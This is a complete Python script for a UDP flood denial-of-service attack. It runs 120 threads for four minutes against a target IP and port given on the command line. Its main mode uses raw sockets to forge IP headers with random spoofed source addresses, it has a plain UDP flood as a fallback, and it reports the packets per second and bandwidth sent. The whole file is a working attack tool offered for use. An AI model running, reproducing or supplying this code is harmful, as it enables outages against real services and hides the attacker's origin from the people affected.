import socket
import threading
import time
import sys
import random
import struct

# ========== CONFIGURATION ==========
NUM_THREADS = 120
DURATION_SEC = 240          # 4 minutes
PACKET_SIZE = 1400          # Spoofing works better with smaller packets (avoid fragmentation)
USE_SPOOFING = True         # Set to False to use normal UDP socket
# ===================================

# Function to generate a random source IP
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Build a complete IP + UDP packet (raw socket)
def build_packet(src_ip, dst_ip, dst_port, payload):
    # IP header (no options)
    ip_ver_ihl = 0x45           # IPv4, header length 20 bytes
    ip_tos = 0
    ip_tot_len = 20 + 8 + len(payload)   # IP header + UDP header + payload
    ip_id = random.randint(1, 65535)
    ip_flags_offset = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_UDP
    ip_checksum = 0             # Will be calculated later
    ip_src = socket.inet_aton(src_ip)
    ip_dst = socket.inet_aton(dst_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
        ip_flags_offset, ip_ttl, ip_proto, ip_checksum,
        ip_src, ip_dst
    )

    # Calculate IP checksum
    def checksum(data):
        s = 0
        n = len(data) // 2
        for i in range(n):
            s += struct.unpack('!H', data[i*2:(i+1)*2])[0]
        if len(data) % 2:
            s += data[-1] << 8
        while s >> 16:
            s = (s & 0xFFFF) + (s >> 16)
        return ~s & 0xFFFF

    ip_checksum = checksum(ip_header[:10] + b'\x00\x00' + ip_header[12:])
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
        ip_flags_offset, ip_ttl, ip_proto, ip_checksum,
        ip_src, ip_dst
    )

    # UDP header
    udp_src_port = random.randint(1024, 65535)
    udp_dst_port = dst_port
    udp_len = 8 + len(payload)
    udp_checksum = 0   # Can be zero for UDP (optional on IPv4)
    udp_header = struct.pack('!HHHH', udp_src_port, udp_dst_port, udp_len, udp_checksum)

    return ip_header + udp_header + payload

# Thread function using raw socket (spoofing)
def flood_spoof(ip, port, stop_event, counter_list, idx):
    try:
        # Raw socket – requires root
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        # Tell kernel we are providing the IP header
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f"[!] Thread {idx}: Raw socket requires root. Exiting.")
        counter_list[idx] = 0
        return

    local_sent = 0
    payload = random._urandom(PACKET_SIZE)

    while not stop_event.is_set():
        src_ip = random_ip()
        packet = build_packet(src_ip, ip, port, payload)
        try:
            sock.sendto(packet, (ip, 0))   # Port ignored because IP header already contains it
            local_sent += 1
        except OSError:
            # Network unreachable, etc.
            pass

    counter_list[idx] = local_sent
    sock.close()

# Original non‑spoofing thread (for comparison)
def flood_normal(ip, port, stop_event, counter_list, idx):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(PACKET_SIZE)
    local_sent = 0
    while not stop_event.is_set():
        sock.sendto(payload, (ip, port))
        local_sent += 1
    counter_list[idx] = local_sent
    sock.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: sudo python udp_spoof.py <TARGET_IP> <TARGET_PORT>")
        print("Example: sudo python udp_spoof.py 192.168.1.10 8080")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    print(f"Target: {target_ip}:{target_port}")
    print(f"Threads: {NUM_THREADS}")
    print(f"Duration: {DURATION_SEC} seconds (4 minutes)")
    print(f"Packet size: {PACKET_SIZE} bytes")
    print(f"Spoofing: {'ON (random source IPs)' if USE_SPOOFING else 'OFF'}")
    print("Starting... (requires root!)")

    stop_event = threading.Event()
    counters = [0] * NUM_THREADS
    threads = []

    for i in range(NUM_THREADS):
        if USE_SPOOFING:
            t = threading.Thread(target=flood_spoof, args=(target_ip, target_port, stop_event, counters, i))
        else:
            t = threading.Thread(target=flood_normal, args=(target_ip, target_port, stop_event, counters, i))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(DURATION_SEC)
    except KeyboardInterrupt:
        print("\nEarly stop requested...")
    finally:
        stop_event.set()

    for t in threads:
        t.join(timeout=0.1)

    total_packets = sum(counters)
    elapsed = DURATION_SEC
    pps = total_packets / elapsed if elapsed > 0 else 0
    mbps = (total_packets * PACKET_SIZE * 8) / (elapsed * 1_000_000) if elapsed > 0 else 0

    print("\n===== STATISTICS =====")
    print(f"Total packets sent: {total_packets:,}")
    print(f"Average PPS: {pps:,.0f}")
    print(f"Average bandwidth: {mbps:.2f} Mbps")
    print("======================")

if __name__ == "__main__":
    main()
